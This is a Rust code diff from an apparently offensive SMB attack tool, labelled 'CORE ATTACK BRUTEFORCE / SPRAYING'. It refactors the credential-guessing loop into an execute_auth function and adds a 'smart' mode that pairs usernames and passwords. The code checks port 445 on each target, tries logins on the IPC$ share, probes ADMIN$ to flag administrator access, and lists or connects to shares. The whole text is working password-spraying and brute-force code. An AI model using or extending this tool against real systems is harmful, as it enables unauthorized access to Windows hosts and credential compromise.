@@ -63,41 +63,53 @@ pub async fn check_open(ip: &str, port: u16) -> bool {
     }
 }
 
+pub async fn execute_auth(ip: &str, username: &str, password: &str, args: &Args, mode: &bool) {
+    let client = Client::new(ClientConfig::default());
+    let connection = connect_share(&client, &ip, "IPC$", &username, &password).await;
+    match connection {
+        Ok(_c) => {
+            let is_admin = connect_share(&client, &ip, "ADMIN$", &username, &password).await.is_ok();
+            if is_admin {
+                println!("[+] [{}] {}:{} [{}]", ip, username, password, "ADMIN".green());
+            } else {
+                println!("[+] [{}] {}:{} [{}]", ip, username, password, "USER".yellow());
+            }
+            if args.list {
+                list_shares(connection, &client, &ip).await;
+            } else if let Some(ref share_target) = args.connect {
+                match connect_share(&client, &ip, &share_target, &username, &password).await {
+                    Ok(_c) => println!("[{}]", share_target),
+                    Err(e) => println!("[-] Error: {}", e),
+                }
+            }
+            if *mode { return };
+        }
+        Err(_e) => println!("[-] [{}] {}:{} [{}]", ip, username, password, "FAILED".red()),
+    }
+}
+
 // CORE ATTACK BRUTEFORCE / SPRAYING / CONNECT SHARE / LIST SHARE
 pub async fn attack(users: &Vec<String>, passwords: &Vec<String>, targets: &Vec<String>, some_args: &Args) {
     let is_spraying = users.len() > 1 && passwords.len() == 1;
     let is_bruteforce = users.len() == 1 && passwords.len() > 1;
-    
+    let is_smart = some_args.smart;
+
     if is_spraying { println!("[i] Starting spraying attack against {} users", users.len()) } 
     else if is_bruteforce { println!("[i] Starting bruteforce attack with {} passwords", passwords.len()); }
+    else if is_smart {println!("[i] Starting smart attack with {} combos", users.len())}
         
     for ip in targets {
         if check_open(&ip, 445).await {
             println!("[+] [{}]", ip);
             
-            for username in users {
-                for password in passwords {
-                    let client = Client::new(ClientConfig::default());
-                    let connection = connect_share(&client, &ip, "IPC$", &username, &password).await;
-                    match connection {
-                        Ok(_c) => {
-                            let is_admin = connect_share(&client, &ip, "ADMIN$", &username, &password).await.is_ok();
-                            if is_admin {
-                                println!("[+] [{}] {}:{} [{}]", ip, username, password, "ADMIN".green());
-                            } else {
-                                println!("[+] [{}] {}:{} [{}]", ip, username, password, "USER".yellow());
-                            }
-                            if some_args.list {
-                                list_shares(connection, &client, &ip).await;
-                            } else if let Some(ref share_target) = some_args.connect {
-                                match connect_share(&client, &ip, &share_target, &username, &password).await {
-                                    Ok(_c) => println!("[{}]", share_target),
-                                    Err(e) => println!("[-] Error: {}", e),
-                                }
-                            }
-                            if is_bruteforce { break; }
-                        }
-                        Err(_e) => println!("[-] [{}] {}:{} [{}]", ip, username, password, "FAILED".red()),
+            if is_smart {
+                for (username, password) in users.iter().zip(passwords.iter()) {
+                    execute_auth(&ip, username, password, some_args, &is_bruteforce).await;
+                }
+            } else {
+                for username in users {
+                    for password in passwords {
+                        execute_auth(&ip, username, password, some_args, &is_bruteforce).await;
                     }
                 }
             }
